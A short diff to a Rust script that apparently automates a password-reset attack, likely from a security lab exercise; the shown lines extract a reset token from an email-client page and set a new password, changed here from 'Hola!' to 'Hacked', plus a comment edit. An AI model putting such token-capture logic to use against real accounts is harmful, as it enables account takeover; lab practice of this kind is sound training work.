@@ -54,7 +54,7 @@ fn main() {
             // if request is OK
             let token =
                 extract_pattern("temp-forgot-password-token=(.*)'", &get_res.text().unwrap()); // extract the token from the page
-            let new_password = "Hola!"; // change the password to what you want
+            let new_password = "Hacked"; // change the password to what you want
             println!(
                 "{}",
                 "2. Extract the token from the email client.. ☑️"
@@ -107,7 +107,7 @@ fn build_client() -> Client {
 }
 
 /****************************************************
-* Reusable function to extract a pattern form a text
+* Function to extract a pattern form a text
 *****************************************************/
 fn extract_pattern(pattern: &str, text: &str) -> String {
     Regex::new(pattern)
